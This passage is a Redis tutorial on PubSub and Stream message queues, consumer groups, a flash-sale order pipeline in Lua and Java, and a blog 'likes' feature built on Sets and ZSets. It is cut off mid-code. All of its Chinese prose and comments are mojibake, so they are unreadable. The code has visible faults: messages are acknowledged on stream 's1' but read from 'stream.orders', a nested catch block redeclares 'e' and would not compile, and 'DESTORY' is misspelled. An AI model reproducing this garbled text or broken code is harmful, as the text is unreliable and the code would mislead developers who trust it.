â¸åŸºäºPubSubçš„æ¶ˆæ¯é˜Ÿåˆ—\n\nPubSubï¼ˆå‘å¸ƒè®¢é˜…ï¼‰æ˜¯Redis2.0ç‰ˆæœ¬å¼•å…¥çš„æ¶ˆæ¯ä¼ é€’æ¨¡å‹ã€‚æ¶ˆè´¹è€…å¯ä»¥è®¢é˜…ä¸€ä¸ªæˆ–å¤šä¸ªchannelï¼Œç”Ÿäº§è€…å‘å¯¹åº”channelå‘é€æ¶ˆæ¯åï¼Œæ‰€æœ‰è®¢é˜…è€…éƒ½èƒ½æ”¶åˆ°ç›¸å…³æ¶ˆæ¯ã€‚\n\n- SUBSCRIBE channel [channel] ï¼šè®¢é˜…ä¸€ä¸ªæˆ–å¤šä¸ªé¢‘é“\n-  PUBLISH channel msg ï¼šå‘ä¸€ä¸ªé¢‘é“å‘é€æ¶ˆæ¯\n- PSUBSCRIBE pattern[pattern] ï¼šè®¢é˜…ä¸patternæ ¼å¼åŒ¹é…çš„æ‰€æœ‰é¢‘é“\n\n![](https://img.jwt1399.top/img/202211281840014.png)\n\nåŸºäºPubSubçš„æ¶ˆæ¯é˜Ÿåˆ—æœ‰å“ªäº›ä¼˜ç¼ºç‚¹ï¼Ÿ\nä¼˜ç‚¹ï¼š\n\n* é‡‡ç”¨å‘å¸ƒè®¢é˜…æ¨¡å‹ï¼Œæ”¯æŒå¤šç”Ÿäº§ã€å¤šæ¶ˆè´¹\n\nç¼ºç‚¹ï¼š\n\n* ä¸æ”¯æŒæ•°æ®æŒä¹…åŒ–\n* æ— æ³•é¿å…æ¶ˆæ¯ä¸¢å¤±\n* æ¶ˆæ¯å †ç§¯æœ‰ä¸Šé™ï¼Œè¶…å‡ºæ—¶æ•°æ®ä¸¢å¤±\n\n## â¹åŸºäºStreamçš„æ¶ˆæ¯é˜Ÿåˆ—\n\nStream æ˜¯ Redis 5.0 å¼•å…¥çš„ä¸€ç§æ–°æ•°æ®ç±»å‹ï¼Œå¯ä»¥å®ç°ä¸€ä¸ªåŠŸèƒ½éå¸¸å®Œå–„çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚\n\nå‘é€æ¶ˆæ¯çš„å‘½ä»¤ï¼šXADD\n\n![](https://img.jwt1399.top/img/202211281903260.png)\n\nä¾‹å¦‚ï¼š\n\n![](https://img.jwt1399.top/img/202211281903875.png)\n\nè¯»å–æ¶ˆæ¯çš„æ–¹å¼ä¹‹ä¸€ï¼šXREAD\n\n![](https://img.jwt1399.top/img/202211281905063.png)\n\nä¾‹å¦‚ï¼Œä½¿ç”¨XREADè¯»å–ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼š\n\n![](https://img.jwt1399.top/img/202211281905688.png)\n\nä¾‹å¦‚ï¼ŒXREADé˜»å¡æ–¹å¼ï¼Œè¯»å–æœ€æ–°çš„æ¶ˆæ¯ï¼š\n\n![](https://img.jwt1399.top/img/202211281905433.png)\n\nåœ¨ä¸šåŠ¡å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾ªç¯çš„è°ƒç”¨XREADé˜»å¡æ–¹å¼æ¥æŸ¥è¯¢æœ€æ–°æ¶ˆæ¯ï¼Œä»è€Œå®ç°æŒç»­ç›‘å¬é˜Ÿåˆ—çš„æ•ˆæœï¼Œä¼ªä»£ç å¦‚ä¸‹\n\n![](https://img.jwt1399.top/img/202211281907873.png)\n\næ³¨æ„ï¼šå½“æˆ‘ä»¬æŒ‡å®šèµ·å§‹IDä¸º$æ—¶ï¼Œä»£è¡¨è¯»å–æœ€æ–°çš„æ¶ˆæ¯ï¼Œå¦‚æœæˆ‘ä»¬å¤„ç†ä¸€æ¡æ¶ˆæ¯çš„è¿‡ç¨‹ä¸­ï¼Œåˆæœ‰è¶…è¿‡1æ¡ä»¥ä¸Šçš„æ¶ˆæ¯åˆ°è¾¾é˜Ÿåˆ—ï¼Œåˆ™ä¸‹æ¬¡è·å–æ—¶ä¹Ÿåªèƒ½è·å–åˆ°æœ€æ–°çš„ä¸€æ¡ï¼Œä¼šå‡ºç°æ¼è¯»æ¶ˆæ¯çš„é—®é¢˜\n\nSTREAMç±»å‹æ¶ˆæ¯é˜Ÿåˆ—çš„XREADå‘½ä»¤ç‰¹ç‚¹ï¼š\n\n* æ¶ˆæ¯å¯å›æº¯ï¼ˆæ¶ˆæ¯å¯é‡å¤è¯»ï¼‰\n* ä¸€ä¸ªæ¶ˆæ¯å¯ä»¥è¢«å¤šä¸ªæ¶ˆè´¹è€…è¯»å–\n* å¯ä»¥é˜»å¡è¯»å–\n* æœ‰æ¶ˆæ¯æ¼è¯»çš„é£é™©\n\n## âºåŸºäºStreamçš„æ¶ˆæ¯é˜Ÿåˆ—-æ¶ˆè´¹è€…ç»„\n\næ¶ˆè´¹è€…ç»„ï¼ˆConsumer Groupï¼‰ï¼šå°†å¤šä¸ªæ¶ˆè´¹è€…åˆ’åˆ†åˆ°ä¸€ä¸ªç»„ä¸­ï¼Œç›‘å¬åŒä¸€ä¸ªé˜Ÿåˆ—ã€‚å…·å¤‡ä¸‹åˆ—ç‰¹ç‚¹ï¼š\n\n![](https://img.jwt1399.top/img/202211281930845.png)\n\n**åˆ›å»ºæ¶ˆè´¹è€…ç»„ï¼š**\n\n```sql\nXGROUP CREATE key groupName ID [MKSTREAM]\n```\n\n- keyï¼šé˜Ÿåˆ—åç§°\n- groupNameï¼šæ¶ˆè´¹è€…ç»„åç§°\n- IDï¼šèµ·å§‹IDæ ‡ç¤ºï¼Œ$ä»£è¡¨é˜Ÿåˆ—ä¸­æœ€åä¸€ä¸ªæ¶ˆæ¯ï¼Œ0åˆ™ä»£è¡¨é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªæ¶ˆæ¯\n- MKSTREAMï¼šé˜Ÿåˆ—ä¸å­˜åœ¨æ—¶è‡ªåŠ¨åˆ›å»ºé˜Ÿåˆ—\n\n **åˆ é™¤æŒ‡å®šçš„æ¶ˆè´¹è€…ç»„**\n\n```sql\nXGROUP DESTORY key groupName\n```\n\n **ç»™æŒ‡å®šçš„æ¶ˆè´¹è€…ç»„æ·»åŠ æ¶ˆè´¹è€…**\n\n```sql\nXGROUP CREATECONSUMER key groupName consumername\n```\n\n **åˆ é™¤æ¶ˆè´¹è€…ç»„ä¸­çš„æŒ‡å®šæ¶ˆè´¹è€…**\n\n```sql\nXGROUP DELCONSUMER key groupName consumername\n```\n\n**ä»æ¶ˆè´¹è€…ç»„è¯»å–æ¶ˆæ¯**\n\n```sql\nXREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] [NOACK] STREAMS key [key ...] ID [ID ...]\n```\n\n* groupï¼šæ¶ˆè´¹ç»„åç§°\n* consumerï¼šæ¶ˆè´¹è€…åç§°ï¼Œå¦‚æœæ¶ˆè´¹è€…ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ¶ˆè´¹è€…\n* countï¼šæœ¬æ¬¡æŸ¥è¯¢çš„æœ€å¤§æ•°é‡\n* BLOCK millisecondsï¼šå½“æ²¡æœ‰æ¶ˆæ¯æ—¶æœ€é•¿ç­‰å¾…æ—¶é—´\n* NOACKï¼šæ— éœ€æ‰‹åŠ¨ACKï¼Œè·å–åˆ°æ¶ˆæ¯åè‡ªåŠ¨ç¡®è®¤\n* STREAMS keyï¼šæŒ‡å®šé˜Ÿåˆ—åç§°\n* IDï¼šè·å–æ¶ˆæ¯çš„èµ·å§‹IDï¼š\n  -  \">\"ï¼šä»ä¸‹ä¸€ä¸ªæœªæ¶ˆè´¹çš„æ¶ˆæ¯å¼€å§‹\n  - å…¶å®ƒï¼šæ ¹æ®æŒ‡å®šidä»pending-listä¸­è·å–å·²æ¶ˆè´¹ä½†æœªç¡®è®¤çš„æ¶ˆæ¯ï¼Œä¾‹å¦‚0ï¼Œæ˜¯ä»pending-listä¸­çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯å¼€å§‹\n\næ¶ˆè´¹è€…ç›‘å¬æ¶ˆæ¯çš„åŸºæœ¬æ€è·¯ï¼šä¼ªä»£ç å¦‚ä¸‹\n\n![](https://img.jwt1399.top/img/202211281947654.png)\n\n**æ€»ç»“**\n\nSTREAMç±»å‹æ¶ˆæ¯é˜Ÿåˆ—çš„XREADGROUPå‘½ä»¤ç‰¹ç‚¹ï¼š\n\n* æ¶ˆæ¯å¯å›æº¯\n* å¯ä»¥å¤šæ¶ˆè´¹è€…äº‰æŠ¢æ¶ˆæ¯ï¼ŒåŠ å¿«æ¶ˆè´¹é€Ÿåº¦\n* å¯ä»¥é˜»å¡è¯»å–\n* æ²¡æœ‰æ¶ˆæ¯æ¼è¯»çš„é£é™©\n* æœ‰æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ï¼Œä¿è¯æ¶ˆæ¯è‡³å°‘è¢«æ¶ˆè´¹ä¸€æ¬¡\n\næœ€åæˆ‘ä»¬æ¥ä¸ªå°å¯¹æ¯”\n\n![](https://img.jwt1399.top/img/202211281940958.png)\n\n## â»Streamæ¶ˆæ¯é˜Ÿåˆ—å®ç°å¼‚æ­¥ç§’æ€ä¸‹å•\n\n* åˆ›å»ºä¸€ä¸ªStreamç±»å‹çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåä¸ºstream.orders\n\n```sql\nXGROUP CREATE stream.orders g1 0 MKSTREAM\n```\n\n* ä¿®æ”¹ä¹‹å‰çš„ç§’æ€ä¸‹å•Luaè„šæœ¬ï¼ˆseckill.luaï¼‰ï¼Œåœ¨è®¤å®šæœ‰æŠ¢è´­èµ„æ ¼åï¼Œç›´æ¥å‘stream.ordersä¸­æ·»åŠ æ¶ˆæ¯ï¼Œå†…å®¹åŒ…å«voucherIdã€userIdã€orderId\n\n```sql\n-- 3.6.å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ä¸­ï¼Œ XADD stream.orders * k1 v1 k2 v2 ...\nredis.call('xadd', 'stream.orders', '*', 'userId', userId, 'voucherId', voucherId, 'id', orderId)\n```\n\n\n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n  //è·å–ç”¨æˆ·\n  Long userId = UserHolder.getUser().getId();\n  long orderId = redisIdWorker.nextId(\"order\");\n  // 1.æ‰§è¡Œluaè„šæœ¬\n  Long result = stringRedisTemplate.execute(\n    SECKILL_SCRIPT, \t\t\t\t\t\t//luaè„šæœ¬\n    Collections.emptyList(),   //KEY\n    voucherId.toString(),     //ARGV[1]\n    userId.toString(),       //ARGV[2]\n    String.valueOf(orderId) //ARGV[3]\n  );\n  int r = result.intValue(); //è½¬æˆint\n  // 2.åˆ¤æ–­ç»“æœæ˜¯å¦ä¸º0\n  if (r != 0) {\n    // 2.1.ä¸ä¸º0 ï¼Œä»£è¡¨æ²¡æœ‰è´­ä¹°èµ„æ ¼\n    return Result.fail(r == 1 ? \"åº“å­˜ä¸è¶³\" : \"ä¸èƒ½é‡å¤ä¸‹å•\");\n  }\n\n  // 3.è·å–ä»£ç†å¯¹è±¡\n  proxy = (IVoucherOrderService)AopContext.currentProxy();\n\n  // 4.è¿”å›è®¢å•id\n  return Result.ok(orderId);\n}\n```\n\n- é¡¹ç›®å¯åŠ¨æ—¶ï¼Œå¼€å¯ä¸€ä¸ªçº¿ç¨‹ä»»åŠ¡ï¼Œå°è¯•è·å–stream.ordersä¸­çš„æ¶ˆæ¯ï¼Œå®Œæˆä¸‹å•\n\n```java\nprivate class VoucherOrderHandler implements Runnable {\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                // 1.è·å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„è®¢å•ä¿¡æ¯ \n                // XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 >\n                List<MapRecord<String, Object, Object>> list = stringRedisTemplate.opsForStream().read(\n                    Consumer.from(\"g1\", \"c1\"),\n                    StreamReadOptions.empty().count(1).block(Duration.ofSeconds(2)),\n                    StreamOffset.create(\"stream.orders\", ReadOffset.lastConsumed())\n                );\n                // 2.åˆ¤æ–­è®¢å•ä¿¡æ¯æ˜¯å¦ä¸ºç©º\n                if (list == null || list.isEmpty()) {\n                    // å¦‚æœä¸ºnullï¼Œè¯´æ˜æ²¡æœ‰æ¶ˆæ¯ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯\n                    continue;\n                }\n                // è§£ææ•°æ®\n                MapRecord<String, Object, Object> record = list.get(0);\n                Map<Object, Object> value = record.getValue();\n                VoucherOrder voucherOrder = BeanUtil.fillBeanWithMap(value, new VoucherOrder(), true);\n                // 3.åˆ›å»ºè®¢å•\n                createVoucherOrder(voucherOrder);\n                // 4.ç¡®è®¤æ¶ˆæ¯ XACK\n                stringRedisTemplate.opsForStream().acknowledge(\"s1\", \"g1\", record.getId());\n            } catch (Exception e) {\n                log.error(\"å¤„ç†è®¢å•å¼‚å¸¸\", e);\n                //å¤„ç†å¼‚å¸¸æ¶ˆæ¯\n                handlePendingList();\n            }\n        }\n    }\n\n    private void handlePendingList() {\n        while (true) {\n            try {\n                // 1.è·å–pending-listä¸­çš„è®¢å•ä¿¡æ¯ \n               // XREADGROUP GROUP g1 c1 COUNT 1 BLOCK 2000 STREAMS s1 0\n                List<MapRecord<String, Object, Object>> list = stringRedisTemplate.opsForStream().read(\n                    Consumer.from(\"g1\", \"c1\"),\n                    StreamReadOptions.empty().count(1),\n                    StreamOffset.create(\"stream.orders\", ReadOffset.from(\"0\"))\n                );\n                // 2.åˆ¤æ–­è®¢å•ä¿¡æ¯æ˜¯å¦ä¸ºç©º\n                if (list == null || list.isEmpty()) {\n                    // å¦‚æœä¸ºnullï¼Œè¯´æ˜æ²¡æœ‰å¼‚å¸¸æ¶ˆæ¯ï¼Œç»“æŸå¾ªç¯\n                    break;\n                }\n                // è§£ææ•°æ®\n                MapRecord<String, Object, Object> record = list.get(0);\n                Map<Object, Object> value = record.getValue();\n                VoucherOrder voucherOrder = BeanUtil.fillBeanWithMap(value, new VoucherOrder(), true);\n                // 3.åˆ›å»ºè®¢å•\n                createVoucherOrder(voucherOrder);\n                // 4.ç¡®è®¤æ¶ˆæ¯ XACK\n                stringRedisTemplate.opsForStream().acknowledge(\"s1\", \"g1\", record.getId());\n            } catch (Exception e) {\n                log.error(\"å¤„ç†penddingè®¢å•å¼‚å¸¸\", e);\n                try{\n                    Thread.sleep(20);\n                }catch(Exception e){\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n\n# â‘§è¾¾äººæ¢åº—-ZSet\n\n## â¶å‘å¸ƒæ¢åº—ç¬”è®°\n\næ¢åº—ç¬”è®°ç±»ä¼¼ç‚¹è¯„ç½‘ç«™çš„è¯„ä»·ï¼Œå¾€å¾€æ˜¯å›¾æ–‡ç»“åˆã€‚å¯¹åº”çš„è¡¨æœ‰ä¸¤ä¸ªï¼š\n\n- tb_blogï¼šæ¢åº—ç¬”è®°è¡¨ï¼ŒåŒ…å«ç¬”è®°ä¸­çš„æ ‡é¢˜ã€æ–‡å­—ã€å›¾ç‰‡ç­‰\n- tb_blog_commentsï¼šå…¶ä»–ç”¨æˆ·å¯¹æ¢åº—ç¬”è®°çš„è¯„ä»·\n\n```sql\nCREATE TABLE `tb_blog` (\n  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'ä¸»é”®',\n  `shop_id` bigint(20) NOT NULL COMMENT 'å•†æˆ·id',\n  `user_id` bigint(20) unsigned NOT NULL COMMENT 'ç”¨æˆ·id',\n  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'æ ‡é¢˜',\n  `images` varchar(2048) NOT NULL COMMENT 'æ¢åº—çš„ç…§ç‰‡ï¼Œæœ€å¤š9å¼ ï¼Œå¤šå¼ ä»¥\",\"éš”å¼€',\n  `content` varchar(2048) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'æ¢åº—çš„æ–‡å­—æè¿°',\n  `liked` int(8) unsigned DEFAULT '0' COMMENT 'ç‚¹èµæ•°é‡',\n  `comments` int(8) unsigned DEFAULT NULL COMMENT 'è¯„è®ºæ•°é‡',\n  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',\n  `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'æ›´æ–°æ—¶é—´',\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 ROW_FORMAT=COMPACT;\n\n\nCREATE TABLE `tb_blog_comments` (\n  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'ä¸»é”®',\n  `user_id` bigint(20) unsigned NOT NULL COMMENT 'ç”¨æˆ·id',\n  `blog_id` bigint(20) unsigned NOT NULL COMMENT 'æ¢åº—id',\n  `parent_id` bigint(20) unsigned NOT NULL COMMENT 'å…³è”çš„1çº§è¯„è®ºidï¼Œå¦‚æœæ˜¯ä¸€çº§è¯„è®ºï¼Œåˆ™å€¼ä¸º0',\n  `answer_id` bigint(20) unsigned NOT NULL COMMENT 'å›å¤çš„è¯„è®ºid',\n  `content` varchar(255) NOT NULL COMMENT 'å›å¤çš„å†…å®¹',\n  `liked` int(8) unsigned DEFAULT NULL COMMENT 'ç‚¹èµæ•°',\n  `status` tinyint(1) unsigned DEFAULT NULL COMMENT 'çŠ¶æ€ï¼Œ0ï¼šæ­£å¸¸ï¼Œ1ï¼šè¢«ä¸¾æŠ¥ï¼Œ2ï¼šç¦æ­¢æŸ¥çœ‹',\n  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',\n  `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'æ›´æ–°æ—¶é—´',\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 ROW_FORMAT=COMPACT;\n```\n\n**å…·ä½“å‘å¸ƒæµç¨‹**\n\n![](https://img.jwt1399.top/img/202211282140795.png)\n\nä¸Šä¼ æ¥å£\n\n```java\n@Slf4j\n@RestController\n@RequestMapping(\"upload\")\npublic class UploadController {\n\n    @PostMapping(\"blog\")\n    public Result uploadImage(@RequestParam(\"file\") MultipartFile image) {\n        try {\n            // è·å–åŸå§‹æ–‡ä»¶åç§°\n            String originalFilename = image.getOriginalFilename();\n            // ç”Ÿæˆæ–°æ–‡ä»¶å\n            String fileName = createNewFileName(originalFilename);\n            // ä¿å­˜æ–‡ä»¶\n            image.transferTo(new File(SystemConstants.IMAGE_UPLOAD_DIR, fileName));\n            // è¿”å›ç»“æœ\n            log.debug(\"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œ{}\", fileName);\n            return Result.ok(fileName);\n        } catch (IOException e) {\n            throw new RuntimeException(\"æ–‡ä»¶ä¸Šä¼ å¤±è´¥\", e);\n        }\n    }\n}\n\n//æ³¨æ„ï¼šæ“ä½œæ—¶ï¼Œéœ€è¦ä¿®æ”¹SystemConstants.IMAGE_UPLOAD_DIR è‡ªå·±å›¾ç‰‡æ‰€åœ¨çš„åœ°å€ï¼Œåœ¨å®é™…å¼€å‘ä¸­å›¾ç‰‡ä¸€èˆ¬ä¼šæ”¾åœ¨nginxä¸Šæˆ–è€…æ˜¯äº‘å­˜å‚¨ä¸Šã€‚\n```\n\nå‘å¸ƒæ¥å£\n\n```java\n@RestController\n@RequestMapping(\"/blog\")\npublic class BlogController {\n\n    @Resource\n    private IBlogService blogService;\n\n    @PostMapping\n    public Result saveBlog(@RequestBody Blog blog) {\n        // è·å–ç™»å½•ç”¨æˆ·\n        UserDTO user = UserHolder.getUser();\n        blog.setUserId(user.getId());\n        // ä¿å­˜æ¢åº—åšæ–‡\n        blogService.save(blog);\n        // è¿”å›id\n        return Result.ok(blog.getId());\n    }\n}\n```\n\n## â·æŸ¥çœ‹æ¢åº—ç¬”è®°\n\n![](https://img.jwt1399.top/img/202211282150749.png)\n\n```java\n@RestController\n@RequestMapping(\"/blog\")\npublic class BlogController {\n\n    @Resource\n    private IBlogService blogService;\n  \n    @GetMapping(\"/{id}\")\n    public Result queryBlogById(@PathVariable(\"id\") Long id) {\n      return blogService.queryBlogById(id);\n    }\n}\n```\n\n```java\n@Service\npublic class BlogServiceImpl extends ServiceImpl<BlogMapper, Blog> implements IBlogService {\n\n    @Resource\n    private IUserService userService;\n\n    @Override\n    public Result queryBlogById(Long id) {\n        // 1.æŸ¥è¯¢blog\n        Blog blog = getById(id);\n        if (blog == null) {\n            return Result.fail(\"ç¬”è®°ä¸å­˜åœ¨ï¼\");\n        }\n        // 2.æŸ¥è¯¢blogå¯¹åº”ç”¨æˆ·\n        queryBlogUser(blog);\n        return Result.ok(blog);\n    }\n\n    private void queryBlogUser(Blog blog) {\n        Long userId = blog.getUserId();\n        User user = userService.getById(userId);\n        blog.setName(user.getNickName());\n        blog.setIcon(user.getIcon());\n    }  \n}\n```\n\n## â¸ç‚¹èµåŠŸèƒ½\n\nåˆå§‹ä»£ç \n\n```java\n@GetMapping(\"/likes/{id}\")\npublic Result queryBlogLikes(@PathVariable(\"id\") Long id) {\n    //ä¿®æ”¹ç‚¹èµæ•°é‡\n    blogService.update().setSql(\"liked = liked + 1 \").eq(\"id\",id).update();\n    return Result.ok();\n}\n```\n\né—®é¢˜åˆ†æï¼šè¿™ç§æ–¹å¼ä¼šå¯¼è‡´ä¸€ä¸ªç”¨æˆ·æ— é™ç‚¹èµï¼Œæ˜æ˜¾æ˜¯ä¸åˆç†çš„\n\né€ æˆè¿™ä¸ªé—®é¢˜çš„åŸå› æ˜¯ï¼Œæˆ‘ä»¬ç°åœ¨çš„é€»è¾‘ï¼Œå‘èµ·è¯·æ±‚åªæ˜¯ç»™æ•°æ®åº“+1ï¼Œæ‰€ä»¥æ‰ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜\n\n![1653581590453](../images/Redis-å®æˆ˜ç¯‡/1653581590453.png)\n\nå®Œå–„ç‚¹èµåŠŸèƒ½\n\n* åŒä¸€ä¸ªç”¨æˆ·åªèƒ½ç‚¹èµä¸€æ¬¡ï¼Œå†æ¬¡ç‚¹å‡»åˆ™å–æ¶ˆç‚¹èµ\n* å¦‚æœå½“å‰ç”¨æˆ·å·²ç»ç‚¹èµï¼Œåˆ™ç‚¹èµæŒ‰é’®é«˜äº®æ˜¾ç¤ºï¼ˆå‰ç«¯å·²å®ç°ï¼Œåˆ¤æ–­Blogç±»çš„isLikeå±æ€§ï¼‰\n\nå®ç°æ­¥éª¤ï¼š\n\n* 1.ç»™Blogç±»ä¸­æ·»åŠ ä¸€ä¸ªisLikeå­—æ®µï¼Œæ ‡ç¤ºæ˜¯å¦è¢«å½“å‰ç”¨æˆ·ç‚¹èµ\n* 2.ä¿®æ”¹ç‚¹èµåŠŸèƒ½ï¼Œåˆ©ç”¨Redisçš„seté›†åˆåˆ¤æ–­æ˜¯å¦ç‚¹èµè¿‡ï¼Œæœªç‚¹èµè¿‡åˆ™ç‚¹èµæ•°+1ï¼Œå¹¶å°†ç”¨æˆ·æ·»åŠ åˆ°seté›†åˆï¼›å·²ç‚¹èµè¿‡åˆ™ç‚¹èµæ•°-1ï¼Œå¹¶å°†ç”¨æˆ·ä»seté›†åˆç§»é™¤\n* 3.ä¿®æ”¹æ ¹æ®idæŸ¥è¯¢Blogçš„ä¸šåŠ¡ï¼Œåˆ¤æ–­å½“å‰ç™»å½•ç”¨æˆ·æ˜¯å¦ç‚¹èµè¿‡ï¼Œèµ‹å€¼ç»™isLikeå­—æ®µ\n* 4.ä¿®æ”¹åˆ†é¡µæŸ¥è¯¢Blogä¸šåŠ¡ï¼Œåˆ¤æ–­å½“å‰ç™»å½•ç”¨æˆ·æ˜¯å¦ç‚¹èµè¿‡ï¼Œèµ‹å€¼ç»™isLikeå­—æ®µ\n\nä¸ºä»€ä¹ˆé‡‡ç”¨seté›†åˆï¼šå› ä¸ºç”¨æˆ·ä¸èƒ½é‡å¤ç‚¹èµï¼Œå³æ·»åŠ åˆ°redisçš„æ•°æ®æ˜¯ä¸èƒ½é‡å¤çš„ï¼Œæ‰€ä»¥ç”¨seté›†åˆ\n\nå…·ä½“æ­¥éª¤ï¼š\n\n**æ­¥éª¤ä¸€**\n\n```java\n@TableField(exist = false)\nprivate Boolean isLike;\n```\n\n**æ­¥éª¤äºŒ**\n\n```java\n@Override\npublic Result likeBlog(Long id) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  Long userId = UserHolder.getUser().getId();\n  // 2.åˆ¤æ–­å½“å‰ç™»å½•ç”¨æˆ·æ˜¯å¦å·²ç»ç‚¹èµ\n  String key = BLOG_LIKED_KEY + id;\n  Boolean isMember = stringRedisTemplate.opsForSet().isMember(key, userId.toString());\n  if (BooleanUtil.isFalse(isMember)) {\n    //3.å¦‚æœæœªç‚¹èµï¼Œå¯ä»¥ç‚¹èµ\n    //3.1 æ•°æ®åº“ç‚¹èµæ•°+1\n    boolean isSuccess = update().setSql(\"liked = liked + 1\").eq(\"id\", id).update();\n    //3.2 ä¿å­˜ç”¨æˆ·åˆ°Redisçš„seté›†åˆ\n    if (isSuccess) {\n      stringRedisTemplate.opsForSet().add(key, userId.toString());\n    }\n  } else {\n    //4.å¦‚æœå·²ç‚¹èµï¼Œå–æ¶ˆç‚¹èµ\n    //4.1 æ•°æ®åº“ç‚¹èµæ•°-1\n    boolean isSuccess = update().setSql(\"liked = liked - 1\").eq(\"id\", id).update();\n    //4.2 æŠŠç”¨æˆ·ä»Redisçš„seté›†åˆç§»é™¤\n    if (isSuccess) {\n      stringRedisTemplate.opsForSet().remove(key, userId.toString());\n    }\n  }\n  return Result.ok();\n}\n```\n\n**æ­¥éª¤ä¸‰**\n\n```java\n@Override\npublic Result queryBlogById(Long id) {\n  // 1.æŸ¥è¯¢blog\n  Blog blog = getById(id);\n  if (blog == null) {\n    return Result.fail(\"ç¬”è®°ä¸å­˜åœ¨ï¼\");\n  }\n  // 2.æŸ¥è¯¢blogæœ‰å…³çš„ç”¨æˆ·\n  queryBlogUser(blog);\n  // 3.æŸ¥è¯¢blogæ˜¯å¦è¢«ç‚¹èµ\n  isBlogLiked(blog);\n  return Result.ok(blog);\n}\n\nprivate void isBlogLiked(Blog blog) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  UserDTO user = UserHolder.getUser();\n  //ç”¨æˆ·æœªç™»å½•ï¼Œæ— éœ€æŸ¥è¯¢æ˜¯å¦ç‚¹èµ\n  if(user == null){\n    return;\n  }\n  Long userId = user.getId();\n  // 2.åˆ¤æ–­å½“å‰ç™»å½•ç”¨æˆ·æ˜¯å¦å·²ç»ç‚¹èµ\n  String key = BLOG_LIKED_KEY + blog.getId();\n  Boolean isMember = stringRedisTemplate.opsForSet().isMember(key, userId.toString());\n  blog.setIsLike(BooleanUtil.isTrue(isMember));\n}\n```\n\n**æ­¥éª¤å››**\n\n```java\n@Override\npublic Result queryHotBlog(Integer current) {\n  // æ ¹æ®ç”¨æˆ·æŸ¥è¯¢\n  Page<Blog> page = query()\n    .orderByDesc(\"liked\")\n    .page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));\n  // è·å–å½“å‰é¡µæ•°æ®\n  List<Blog> records = page.getRecords();\n  // æŸ¥è¯¢ç”¨æˆ·\n  records.forEach(blog -> {\n    queryBlogUser(blog);\n    isBlogLiked(blog); //åˆ¤è¯»æ˜¯å¦è¢«ç‚¹èµ\n  });\n  return Result.ok(records);\n}\n```\n\n## â¹ç‚¹èµæ’è¡Œæ¦œ\n\nåœ¨æ¢åº—ç¬”è®°çš„è¯¦æƒ…é¡µé¢ï¼Œåº”è¯¥æŠŠç»™è¯¥ç¬”è®°ç‚¹èµçš„äººæ˜¾ç¤ºå‡ºæ¥ï¼Œæ¯”å¦‚æœ€æ—©ç‚¹èµçš„TOP5ï¼Œå½¢æˆç‚¹èµæ’è¡Œæ¦œï¼š\n\nä¹‹å‰ç‚¹èµçš„ç”¨æˆ·æ˜¯æ”¾åˆ°seté›†åˆï¼Œä½†æ˜¯seté›†åˆæ˜¯ä¸èƒ½æ’åºçš„ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨ä¸€ä¸ªå¯ä»¥æ’åºçš„seté›†åˆ`sortedSet`\n\n![](https://img.jwt1399.top/img/202211292324898.png)\n\n**ä¸ºä»€ä¹ˆä½¿ç”¨sortedSetï¼Ÿ**\n\næ‰€æœ‰ç‚¹èµçš„äººï¼Œéœ€è¦æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“ä½¿ç”¨setæˆ–è€…æ˜¯sortedSetï¼Œå…¶æ¬¡æˆ‘ä»¬éœ€è¦æ’åºï¼Œå°±å¯ä»¥ç›´æ¥é”å®šä½¿ç”¨sortedSetå•¦\n\n![](https://img.jwt1399.top/img/202211292329759.png)\n\n- ä¿®æ”¹ç‚¹èµé€»è¾‘ä»£ç ï¼Œå°†setæ”¹ä¸ºsortedSet\n\n```java\n@Override\npublic Result likeBlog(Long id) {\n  // 1.è·å–ç™»å½•ç”¨æˆ·\n  Long userId = UserHolder.getUser().getId();\n  // 2.åˆ¤æ–­å½“å‰ç™»å½•ç”¨æˆ·æ˜¯å¦å·²ç»ç‚¹èµ\n  String key = BLOG_LIKED_KEY + id;\n  Double score = stringRedisTemplate.opsForZSet().score(key, userId.toString());\n  if (score == null) {\n    // 3.å¦‚æœæœªç‚¹èµï¼Œå¯ä»¥ç‚¹èµ\n    // 